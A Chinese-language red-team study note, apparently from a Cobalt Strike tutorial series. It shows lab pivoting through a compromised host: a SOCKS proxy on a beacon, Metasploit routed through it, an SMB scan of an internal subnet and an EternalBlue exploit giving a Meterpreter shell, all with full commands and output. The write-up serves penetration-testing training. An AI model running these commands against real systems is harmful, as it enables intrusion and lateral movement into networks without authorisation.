---
title: 【CS学习笔记】20、通过Socks转发的方法
date: 2020-04-19 15:06:44
id: 200419-150644
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs20-1.png
summary: 这一小节中，将看看如何构建一个 SOCKS 代理服务器使一个上线主机变成我们的跳板机。
tags:
- Cobalt Strike
- 学习笔记
- 红队
categories:
- CS 学习笔记
---

# 0x00 前言

这一小节中，将看看如何构建一个 SOCKS 代理服务器使一个上线主机变成我们的跳板机。

# 0x01 Pivoting

> 根据 A-Team 团队中 CS 手册中的介绍，`Pivoting` 是指 `将一个受害机器转为其他攻击和工具的跳板` 的操作。

在进行 Pivoting 操作之前，需要将当前会话改为交互模式，也就是说输入命令就被执行，执行 `sleep 0` 即为交互模式。

# 0x02 Socks

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs20-1.png)

* 在当前 beacon 上可以右击选择 `Pivoting --> SOCKS Server` 设置一个 Socks4a 代理服务
* 或者使用命令 `socks [port]` 进行设置
* 使用命令 `socks stop` 关闭 Socks 代理服务

* 在 `View --> Proxy Pivots` 中可以看到已经创建的代理服务

# 0x03 Metasploit 连接到 Socks 代理服务

* CS 中创建好代理后，在 Metasploit 中可以运行以下命令通过 beacon 的 Socks 代理进行通信

```
setg Proxies socks4:127.0.0.1:[port]
setg ReverseAllowProxy true
```

如果感觉上面命令比较长，还可以在 `Proxy Pivots` 界面中点击 `Tunnel` 按钮查看命令。

* 运行以下命令来停止

```
unsetg Proxies
```

setg 命令和 unsetg 表示在 metasploit 中全局有效，不用在每次选择模块后再重新设置。

# 0x04 演示

## 1、环境说明

> 攻击机 IP：192.168.175.200
>
> 上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133
>
> 攻击目标：192.168.232.0/24 地址段

当前已经上线了一个 IP 为 192.168.175.130 主机，通过 ipconfig 发现，该主机也在 192.168.232.0/24 地址段内。

但当前攻击机无法访问 232 的地址段，因此如果想对 232 段内的主机发起攻击，就可以采用将 192.168.175.130 作为跳板机访问的方式。

## 2、设置 socks 代理

开启交互模式

```
sleep 0
```

```powershell
beacon> sleep 0
[*] Tasked beacon to become interactive
[+] host called home, sent: 16 bytes
```

开启 socks 代理

```
socks 9527
```

```powershell
beacon> socks 9527
[+] started SOCKS4a server on: 9527
[+] host called home, sent: 16 bytes
```

以上操作也可以通过图形化的方式进行。

## 3、Metasploit 中进行设置

开启 Metasploit 后，运行 setg 命令

```
setg Proxies socks4:192.168.175.200:9527
```

```powershell
msf5 > setg Proxies socks4:192.168.175.200:9527
Proxies => socks4:192.168.175.200:9527
```

## 4、扫描 192.168.232.0/24 地址段中的 445 端口

这里作为演示，只扫描一下 445 端口

```
use auxiliary/scanner/smb/smb_version
set rhost 192.168.232.0/24
set threads 64
exploit
```

```powershell
msf5 > use auxiliary/scanner/smb/smb_version 

msf5 auxiliary(scanner/smb/smb_version) > set rhost 192.168.232.0/24 
rhost => 192.168.232.0/24

msf5 auxiliary(scanner/smb/smb_version) > set threads 64
threads => 64

msf5 auxiliary(scanner/smb/smb_version) > exploit 
use auxiliary/scanner/smb/smb_version
[*] 192.168.232.0/24:445  - Scanned  44 of 256 hosts (17% complete)
[*] 192.168.232.0/24:445  - Scanned  64 of 256 hosts (25% complete)
[*] 192.168.232.0/24:445  - Scanned 110 of 256 hosts (42% complete)
[*] 192.168.232.0/24:445  - Scanned 111 of 256 hosts (43% complete)
[*] 192.168.232.0/24:445  - Scanned 128 of 256 hosts (50% complete)
[+] 192.168.232.133:445   - Host is running Windows 7 Ultimate SP1 (build:7601) (name:WINTEST) (domain:TEAMSSIX) (signatures:optional)
[+] 192.168.232.132:445   - Host is running Windows 2008 HPC SP1 (build:7601) (name:WINDC) (domain:TEAMSSIX) (signatures:required)
[*] 192.168.232.0/24:445  - Scanned 165 of 256 hosts (64% complete)
[*] 192.168.232.0/24:445  - Scanned 184 of 256 hosts (71% complete)
[*] 192.168.232.0/24:445  - Scanned 220 of 256 hosts (85% complete)
[*] 192.168.232.0/24:445  - Scanned 249 of 256 hosts (97% complete)
[*] 192.168.232.0/24:445  - Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```

## 5、发现利用

通过扫描发现在 192.168.232.0/24 地址段内，除了已经上线的 `133` 主机外，还有 `132` 主机也开放了 445 端口，且该主机为 Windows 2008 的操作系统，这里使用永恒之蓝作为演示。

```
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 192.168.232.132
set payload windows/x64/meterpreter/bind_tcp
exploit
```

```powershell
msf5 > use exploit/windows/smb/ms17_010_eternalblue

msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.232.132
rhosts => 192.168.232.132

msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp

msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit 
[*] 192.168.232.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.232.132:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.232.132:445   - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.232.132:445 - Connecting to target for exploitation.
[+] 192.168.232.132:445 - Connection established for exploitation.
[+] 192.168.232.132:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.232.132:445 - CORE raw buffer dump (51 bytes)
[*] 192.168.232.132:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.232.132:445 - 0x00000010  30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20  008 HPC Edition 
[*] 192.168.232.132:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 192.168.232.132:445 - 0x00000030  6b 20 31                                         k 1             
[+] 192.168.232.132:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.232.132:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.232.132:445 - Sending all but last fragment of exploit packet
[*] 192.168.232.132:445 - Starting non-paged pool grooming
[+] 192.168.232.132:445 - Sending SMBv2 buffers
[+] 192.168.232.132:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.232.132:445 - Sending final SMBv2 buffers.
[*] 192.168.232.132:445 - Sending last fragment of exploit packet!
[*] 192.168.232.132:445 - Receiving response from exploit packet
[+] 192.168.232.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.232.132:445 - Sending egg to corrupted connection.
[*] 192.168.232.132:445 - Triggering free of corrupted buffer.
[*] Started bind TCP handler against 192.168.232.132:4444
[*] Sending stage (201283 bytes) to 192.168.232.132
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 192.168.175.200:9527) at 2020-09-01 22:13:57 -0400
[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > ipconfig
Interface 11
============
Name         : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:d3:6c:3d
MTU          : 1500
IPv4 Address : 192.168.232.132
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::a1ac:3035:cbdf:4872
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

> 参考链接：
> 
>[https://www.bilibili.com/video/BV16b411i7n5](https://www.bilibili.com/video/BV16b411i7n5)
> 
>[https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf](https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf)
> 
>更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)